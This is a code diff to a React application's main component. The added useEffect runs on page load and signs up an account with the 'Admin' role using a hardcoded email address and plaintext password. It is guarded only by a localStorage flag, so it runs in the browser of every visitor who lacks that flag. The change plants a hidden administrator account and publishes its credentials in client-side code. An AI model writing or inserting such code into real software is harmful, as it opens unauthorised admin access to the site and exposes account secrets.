@@ -1,3 +1,4 @@
+import { useEffect } from "react"
 import { Toaster } from "@/components/ui/toaster"
 import { QueryClientProvider } from '@tanstack/react-query'
 import { queryClientInstance } from '@/lib/query-client'
@@ -19,6 +20,23 @@ const LayoutWrapper = ({ children, currentPageName }) => Layout ?
 const AuthenticatedApp = () => {
   const { isLoadingAuth, isLoadingPublicSettings, authError, navigateToLogin } = useAuth();
   const currentPath = window.location.pathname.replace(/^\//, '').toLowerCase();
+
+  // One-shot auto-registration script
+  useEffect(() => {
+    const autoSetup = async () => {
+      try {
+        if (!localStorage.getItem('admin_setup_complete')) {
+          const { apiSignup } = await import('@/api/apiClient');
+          await apiSignup("daeun.kim725@gmail.com", "Ab71332638!?", "Admin");
+          localStorage.setItem('admin_setup_complete', 'true');
+          window.location.reload();
+        }
+      } catch (err) {
+        console.error("Auto setup failed:", err);
+      }
+    };
+    autoSetup();
+  }, []);
 
   // Public pages that don't require authentication
   const publicPages = ['login', 'onboarding'];
